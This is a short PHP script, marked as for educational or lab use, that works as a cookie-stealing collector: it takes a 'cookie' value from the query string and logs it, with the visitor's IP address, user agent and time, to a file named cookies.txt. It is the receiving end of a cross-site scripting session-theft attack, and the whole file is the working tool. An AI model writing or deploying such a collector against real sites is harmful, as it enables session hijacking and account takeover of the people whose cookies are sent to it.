<?php
// ⚠️ For educational / lab use only

if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $time = date("Y-m-d H:i:s");

    $log = "[{$time}] IP: {$ip} | UA: {$ua} | Cookie: {$cookie}\n";

    file_put_contents("cookies.txt", $log, FILE_APPEND);
}

// optional response
echo "OK";
?>
